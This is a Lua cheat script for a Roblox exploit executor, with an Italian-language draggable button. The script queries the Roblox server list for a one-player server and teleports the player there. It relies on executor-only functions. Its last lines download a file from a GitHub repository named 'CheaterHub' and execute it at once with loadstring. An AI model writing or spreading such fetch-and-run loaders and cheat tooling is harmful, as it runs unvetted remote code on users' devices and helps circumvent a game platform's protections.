local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local PlaceId = game.PlaceId

-- GUI
local gui = Instance.new("ScreenGui")
gui.Name = "OnePlayerServerFinder"
gui.ResetOnSpawn = false
gui.Parent = game:GetService("CoreGui")

local button = Instance.new("TextButton")
button.Size = UDim2.new(0, 220, 0, 60)
button.Position = UDim2.new(0.5, -110, 0.5, -30)
button.BackgroundColor3 = Color3.fromRGB(35,35,35)
button.TextColor3 = Color3.fromRGB(255,255,255)
button.TextSize = 18
button.Text = "Trova Server 1 Player"
button.Parent = gui

local corner = Instance.new("UICorner")
corner.Parent = button


-- DRAG BUTTON
local dragging = false
local dragInput
local dragStart
local startPos

local function update(input)
	local delta = input.Position - dragStart
	
	button.Position = UDim2.new(
		startPos.X.Scale,
		startPos.X.Offset + delta.X,
		startPos.Y.Scale,
		startPos.Y.Offset + delta.Y
	)
end

button.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 
	or input.UserInputType == Enum.UserInputType.Touch then
		
		dragging = true
		dragStart = input.Position
		startPos = button.Position
		
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

button.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement
	or input.UserInputType == Enum.UserInputType.Touch then
		
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if dragging and input == dragInput then
		update(input)
	end
end)



-- TELEPORT FUNCTION
local function FindServer()

	button.Text = "Cerco server..."

	local servers = {}
	local cursor = ""

	repeat
		
		local url = "https://games.roblox.com/v1/games/" 
			.. PlaceId 
			.. "/servers/Public?sortOrder=Asc&limit=100"

		if cursor ~= "" then
			url = url .. "&cursor=" .. cursor
		end


		local success, result = pcall(function()
			return game:HttpGet(url)
		end)


		if success then
			
			local data = HttpService:JSONDecode(result)

			for _,server in ipairs(data.data) do
				
				if server.playing == 1 
				and server.id ~= game.JobId then
					
					table.insert(servers, server.id)
				end
			end

			cursor = data.nextPageCursor or ""

		else
			
			warn("Errore HTTP")
			break
		end


	until cursor == "" or #servers > 0



	if #servers > 0 then
		
		local jobId = servers[1]

		button.Text = "Teleport..."

		-- schermata nera
		local black = Instance.new("Frame")
		black.Size = UDim2.fromScale(1,1)
		black.BackgroundColor3 = Color3.new(0,0,0)
		black.ZIndex = 999999
		black.Parent = gui


		TeleportService:TeleportToPlaceInstance(
			PlaceId,
			jobId,
			player
		)

	else
		
		button.Text = "Nessun server trovato"
		
		task.wait(2)
		
		button.Text = "Trova Server 1 Player"
	end
end



button.MouseButton1Click:Connect(function()
	task.spawn(FindServer)
end)

if queue_on_teleport then
   loadstring(game:HttpGet("https://raw.githubusercontent.com/GamerScripter-coder/CheaterHub/refs/heads/main/Join1Player.lua"))()
end
